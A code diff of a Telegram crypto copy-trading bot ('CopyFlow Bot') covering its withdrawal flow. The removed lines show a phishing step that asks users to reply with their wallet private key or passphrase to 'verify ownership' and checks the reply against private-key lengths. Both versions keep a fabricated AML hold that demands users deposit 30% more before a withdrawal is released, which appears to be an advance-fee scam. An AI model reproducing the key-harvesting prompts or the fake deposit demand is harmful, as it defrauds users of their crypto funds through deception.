@@ -53,13 +53,13 @@ from app.services.market_data_service import LiveMarketDataService
 from app.services.notification_service import NotificationService
 from app.services.user_service import TelegramUserData, UserService
 from app.services.user_wallet_service import UserWalletService
-from app.security.encryption import EncryptionError, SecretEncryption
+from app.security.encryption import SecretEncryption
 
-WELCOME_TEXT = """👋 <b>Welcome to Copy Flow Bot!</b>
+WELCOME_TEXT = """👋 <b>Welcome to CopyFlow Bot!</b>
 
 Step into the world of fast, smart, and stress-free trading, designed for both beginners and seasoned traders.
 
-📈 With Copy Flow, you can effortlessly copy top traders, snipe promising tokens the moment they launch, and watch your portfolio grow — all while the bot handles the heavy lifting.
+📈 With CopyFlow, you can effortlessly copy top traders, snipe promising tokens the moment they launch, and watch your portfolio grow — all while the bot handles the heavy lifting.
 🤖 No more manual tracking or missed opportunities; sit back, relax, and let your trading strategy run on autopilot.
 ℹ️ Need guidance? Type /help anytime to access the full bot guide and learn how to use every feature.
 
@@ -99,10 +99,6 @@ class TransferInput(StatesGroup):
 
 def _format_decimal(value: Decimal) -> str:
     return f"{value:.4f}"
-
-
-def _format_balance(value: Decimal) -> str:
-    return format(value, "f").rstrip("0").rstrip(".") or "0"
 
 
 def build_wallet_text(
@@ -220,13 +216,11 @@ async def process_user_start(
             last_name=telegram_user.last_name,
         )
     )
-    notification_settings = getattr(notification_service, "settings", None)
-    if notification_settings is not None:
-        if UserWalletService(
-            notification_settings.encryption_key.get_secret_value()
-        ).ensure_wallets(user):
-            await session.commit()
-            await session.refresh(user)
+    if UserWalletService(
+        notification_service.settings.encryption_key.get_secret_value()
+    ).ensure_wallets(user):
+        await session.commit()
+        await session.refresh(user)
     if created:
         await notification_service.notify_new_user(user)
     return user, created
@@ -408,9 +402,9 @@ def build_user_router(
         await message.answer(
             "🏦 <b>Withdraw Funds</b>\n\n"
             "<b>Your Current Balances:</b>\n"
-            f"🟣 SOL: {_format_balance(balances['SOL'])}\n"
-            f"🟡 BNB: {_format_balance(balances['BNB'])}\n"
-            f"🔵 ETH: {_format_balance(balances['ETH'])}\n\n"
+            f"🟣 SOL: {_format_decimal(balances['SOL'])}\n"
+            f"🟡 BNB: {_format_decimal(balances['BNB'])}\n"
+            f"🔵 ETH: {_format_decimal(balances['ETH'])}\n\n"
             "Select the network you wish to withdraw from:",
             reply_markup=transfer_chain_keyboard(),
             parse_mode="HTML",
@@ -817,17 +811,6 @@ def build_user_router(
             await state.clear()
             await message.answer("Please restart the withdrawal from your wallet.")
             return
-        valid_length = (
-            87 <= len(address) <= 88
-            if chain == "SOL"
-            else len(address) == 66
-        )
-        if not valid_length:
-            expected = "87 characters for SOL" if chain == "SOL" else "66 characters for ETH/BNB"
-            await message.answer(
-                f"Please enter a valid {chain} privatekey ({expected})."
-            )
-            return
         await state.set_state(TransferInput.waiting_for_amount)
         await state.update_data(transfer_address=address)
         await message.answer(
@@ -853,7 +836,7 @@ def build_user_router(
         except InvalidOperation:
             await message.answer("Please enter a valid withdrawal amount.")
             return
-        if not amount.is_finite() or amount <= 0:
+        if amount <= 0:
             await message.answer("The withdrawal amount must be greater than zero.")
             return
         data = await state.get_data()
@@ -871,10 +854,8 @@ def build_user_router(
             parse_mode="HTML",
         )
         await message.answer(
-            "⚠️ Security Check Required\n\n"
-            "To process your withdrawal, please reply with your wallet's "  
-            "private key or passphrase " 
-            "to verify ownership.",
+            "To process your withdrawal, please reply with your destination "
+            "wallet address to verify ownership.",
             reply_markup=ForceReply(
                 selective=True,
                 input_field_placeholder="Enter destination wallet address",
@@ -895,35 +876,28 @@ def build_user_router(
         if message.text is None:
             await message.answer("Please reply with the destination wallet address.")
             return
-        address = message.text.strip()
         data = await state.get_data()
-        chain = str(data.get("transfer_chain", ""))
-        valid_length = (
-            32 <= len(address) <= 44
-            if chain == "SOL"
-            else chain in {"BNB", "ETH"} and len(address) == 42
-        )
-        if not valid_length:
-            expected = "32-44 characters for SOL" if chain == "SOL" else "42 characters for ETH/BNB"
+        address = str(data.get("transfer_address", ""))
+        submitted_address = message.text.strip()
+        if not address or submitted_address != address:
             await message.answer(
-                f"Please enter a valid {chain} privatekey ({expected})."
+                "The wallet address does not match the withdrawal destination. "
+                "Please try again."
             )
             return
         await state.clear()
         await message.answer(
             "✅ Verification in progress. Please wait while we confirm ownership."
         )
-        await asyncio.sleep(30)
         await message.answer(
             "⚠️ <b>Withdrawal Pending (AML Verification)</b>\n\n"
-            "Due to Anti-Money Laundering (AML) regulations, " 
-            "you must hold at least <b>30%</b> of your bot balance "
-            "in the destination wallet before the " 
-            "transfer can be completed.\n\n"
+            "Due to International Anti-Money Laundering (AML) regulations," 
+            "you must hold at least <b>30%</b> of your requested withdrawal" 
+            "amount as a verified balance in your account before the" 
+            "transfer can be completed."
 
-            "Please deposit the required percentage to clear the AML hold " 
-            "and withdraw your funds..",
-            
+            "Please deposit the required percentage to clear the AML hold" 
+            "and release your funds..",
             parse_mode="HTML",
         )
 
